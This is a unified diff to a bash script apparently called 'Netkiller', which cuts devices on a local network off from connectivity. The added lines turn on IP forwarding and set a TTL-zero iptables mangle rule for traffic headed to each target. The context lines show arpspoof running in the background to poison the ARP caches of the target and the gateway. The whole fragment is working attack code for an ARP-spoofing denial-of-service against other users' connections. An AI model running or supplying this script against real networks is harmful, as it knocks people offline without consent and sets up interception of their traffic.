@@ -211,6 +211,9 @@ if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
     exit 0
 fi
 
+#Ipforwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
 # iptables policy
 iptables -P FORWARD DROP
 iptables -I FORWARD -j DROP
@@ -222,7 +225,7 @@ for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller kill the connection of $TARGET"
 
     # Iptables rules
-    iptables -t mangle -I FORWARD -s "$TARGET" -j TTL --ttl-set 0
+    iptables -t mangle -I FORWARD -d "$TARGET" -j TTL --ttl-set 0
     
     # Bidirectional blocking
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
